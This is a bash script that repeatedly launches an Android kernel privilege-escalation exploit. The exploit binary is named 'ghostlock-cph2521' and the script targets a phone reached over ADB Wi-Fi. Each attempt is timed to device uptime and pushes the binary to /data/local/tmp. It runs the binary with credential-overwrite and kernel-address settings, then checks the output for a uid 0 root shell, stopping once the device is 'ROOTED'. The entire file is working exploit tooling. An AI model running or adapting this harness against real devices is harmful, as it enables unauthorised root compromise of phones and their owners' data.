#!/bin/bash
# FAST DUALWRITE loop: fire at uptime>=180, read at +75s, re-roll immediately.
ADB=./adb_local.exe
WIFI=192.168.1.2:5555
cd "$(dirname "$0")"
MAX=${1:-30}
OUT=fastlog_$(date +%H%M).txt
con() { MSYS_NO_PATHCONV=1 "$ADB" connect $WIFI >/dev/null 2>&1; MSYS_NO_PATHCONV=1 "$ADB" devices 2>/dev/null | grep -q "$WIFI.*device"; }
for n in $(seq 1 $MAX); do
  for w in $(seq 1 30); do con && break; sleep 8; done
  con || { echo "roll$n: gone" >> $OUT; break; }
  UP=$(MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell "cut -d. -f1 /proc/uptime" 2>/dev/null | tr -d '\r')
  if [ -n "$UP" ] && [ "$UP" -lt 180 ] 2>/dev/null; then
    S=$((185 - UP)); sleep $S
  fi
  B="q$(date +%s | tail -c 5)"; L="r$(date +%s | tail -c 6)"
  MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI push ghostlock-cph2521 /data/local/tmp/$B >/dev/null 2>&1
  MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell "chmod 755 /data/local/tmp/$B; rm -f /data/local/tmp/ROOTED /data/local/tmp/uid0_id.txt /data/local/tmp/ROOTED_ID.txt; cd /data/local/tmp; nohup sh -c 'timeout 100 env MODE4_ONLY=1 MODE4_SLIDE_CRED=1 MODE4_DUALWRITE=1 MODE4_CRED_INITTASK=1 UID0_DIRECT=1 UID0_PREFER_CHILD=1 UID0_QUIET_CHILD=1 UID0_PUR_SPIN=1 UID0_SLOT=0x778 KPHYS=0xa8000000 CORE_SEL=7 GHOSTLOCK_LIVE_SYNC=/sdcard/ghostlock/aarif/live_sync.log GHOSTLOCK_STAGE=/sdcard/ghostlock/aarif/stage.txt GHOSTLOCK_PROOF=/sdcard/ghostlock/aarif/proof.log /data/local/tmp/$B' > /data/local/tmp/$L.txt 2>&1 &" >/dev/null 2>&1
  echo "roll$n: FIRED $L up=$UP $(date +%H:%M:%S)" >> $OUT
  sleep 75
  con || { sleep 20; con || { echo "roll$n: dropped" >> $OUT; continue; }; }
  R=$(MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell "grep -a 'self_uid=\|WIN\|root shell' /data/local/tmp/$L.txt 2>/dev/null | tail -2; cat /data/local/tmp/ROOTED_ID /data/local/tmp/uid0_id.txt 2>/dev/null; cut -d. -f1 /proc/uptime" 2>/dev/null | tr -d '\r')
  echo "roll$n RESULT: $R" >> $OUT
  echo "$R" | grep -q "ROOTED_ID" && { echo "roll$n: *** ROOTED ***" >> $OUT; break; }
done
echo "FAST DONE $(date)" >> $OUT
